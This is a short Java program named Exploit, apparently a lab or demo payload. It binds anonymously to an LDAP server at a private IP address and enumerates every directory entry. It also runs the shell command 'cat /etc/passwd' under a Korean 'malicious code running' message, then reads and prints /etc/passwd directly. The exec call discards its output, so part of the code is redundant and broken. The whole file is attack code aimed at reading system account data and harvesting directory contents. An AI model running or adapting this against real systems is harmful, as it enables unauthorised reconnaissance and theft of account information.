import javax.naming.*;
import javax.naming.directory.*;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.Hashtable;

public class Exploit {
        public static void main(String[] args) {

                String ldapUrl = "ldap://192.168.52.134:389";
                String baseDN = "dc=test,dc=com";

                Hashtable<String, String> env = new Hashtable<>();
                env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
                env.put(Context.PROVIDER_URL, ldapUrl);
                env.put(Context.SECURITY_AUTHENTICATION, "none");

                try {
                        DirContext ctx = new InitialDirContext(env);
                        exploit();
                        printPasswdFile();

                        String searchFilter = "(objectClass=*)";
                        NamingEnumeration<SearchResult> results = ctx.search(baseDN, searchFilter, null);
                        while (results.hasMore()) {
                                SearchResult result = results.next();
                                System.out.println(result.getNameInNamespace());
                        }

                        ctx.close();
                } catch (Exception e) {
                        e.printStackTrace();
                }
        }

        public static void exploit() {
                try {
                        System.out.println("악성 코드 실행 중...");
                        Runtime.getRuntime().exec("cat /etc/passwd");
                } catch (IOException e) {
                        e.printStackTrace();
                }
        }

        public static void printPasswdFile() {
                try {
                        BufferedReader reader = new BufferedReader(new FileReader("/etc/passwd"));
                        String line;
                        while ((line = reader.readLine()) != null) {
                                System.out.println(line);
                        }
                        reader.close();
                } catch (IOException e) {
                        e.printStackTrace();
                }
        }
}